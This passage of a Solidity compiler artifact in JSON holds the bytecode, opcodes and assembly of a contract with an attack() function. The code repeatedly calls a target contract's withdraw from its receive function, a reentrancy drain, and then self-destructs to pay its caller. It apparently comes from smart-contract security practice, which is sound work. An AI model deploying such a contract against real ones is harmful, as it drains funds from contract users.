							"sourceMap": "861:509:0:-:0;;;924:95;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1002:11;978:10;;:36;;;;;;;;;;;;;;;;;;924:95;861:509;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100225760003560e01c80639e5faafc1461010957610104565b3661010457600061006a60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163134610113565b905060008111156101015760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100e857600080fd5b505af11580156100fc573d6000803e3d6000fd5b505050505b50005b600080fd5b61011161012c565b005b60008183106101225781610124565b825b905092915050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a9534306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b1580156101b457600080fd5b505af11580156101c8573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561024057600080fd5b505af1158015610254573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212203954f8be6c8fff504c368c0e7bf7f08ddeaf368971577b17d9fde49e520db43b64736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x109 JUMPI PUSH2 0x104 JUMP JUMPDEST CALLDATASIZE PUSH2 0x104 JUMPI PUSH1 0x0 PUSH2 0x6A PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE CALLVALUE PUSH2 0x113 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x101 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x111 PUSH2 0x12C JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x122 JUMPI DUP2 PUSH2 0x124 JUMP JUMPDEST DUP3 JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x362A95 CALLVALUE ADDRESS PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1B4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1C8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x254 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY SLOAD 0xF8 0xBE PUSH13 0x8FFF504C368C0E7BF7F08DDEAF CALLDATASIZE DUP10 PUSH18 0x577B17D9FDE49E520DB43B64736F6C634300 MOD 0xC STOP CALLER ",
							"sourceMap": "861:509:0:-:0;;;;;;;;;;;;;;;;;;;;;;;1230:15;1248:48;1265:10;;;;;;;;;;1257:27;;;1286:9;1248:8;:48::i;:::-;1230:66;;1317:1;1307:7;:11;1302:62;;;1329:10;;;;;;;;;;:19;;;1349:7;1329:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1302:62;1197:171;861:509;;;;;1023:170;;;:::i;:::-;;391:104:1;449:7;479:1;475;:5;:13;;487:1;475:13;;;483:1;475:13;468:20;;391:104;;;;:::o;1023:170:0:-;1062:10;;;;;;;;;;:17;;;1087:9;1106:4;1062:50;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1118:10;;;;;;;;;;:19;;;1138:9;1118:30;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1176:10;1155:33;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "135800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 861,
									"end": 1370,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1002,
									"end": 1013,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 978,
									"end": 988,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 978,
									"end": 988,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 978,
									"end": 1014,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 924,
									"end": 1019,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 861,
									"end": 1370,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212203954f8be6c8fff504c368c0e7bf7f08ddeaf368971577b17d9fde49e520db43b64736f6c634300060c0033",
									".code": [
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "9E5FAAFC"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1230,
											"end": 1245,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1296,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1265,
											"end": 1275,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1257,
											"end": 1284,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1257,
											"end": 1284,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1257,
											"end": 1284,
											"name": "BALANCE",
											"source": 0
										},
										{
											"begin": 1286,
											"end": 1295,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1248,
											"end": 1296,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1248,
											"end": 1296,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1248,
											"end": 1296,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1230,
											"end": 1296,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1230,
											"end": 1296,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1317,
											"end": 1318,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1307,
											"end": 1314,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1307,
											"end": 1318,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 1302,
											"end": 1364,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1302,
											"end": 1364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1302,
											"end": 1364,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1329,
											"end": 1339,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1348,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1329,
											"end": 1348,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1348,
											"name": "PUSH",
											"source": 0,
											"value": "2E1A7D4D"
										},
										{
											"begin": 1349,
											"end": 1356,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1329,
											"end": 1357,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1302,
											"end": 1364,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1302,
											"end": 1364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1197,
											"end": 1368,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 861,
											"end": 1370,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1023,
											"end": 1193,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 391,
											"end": 495,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 391,
											"end": 495,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 449,
											"end": 456,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 479,
											"end": 480,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 475,
											"end": 476,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 475,
											"end": 480,
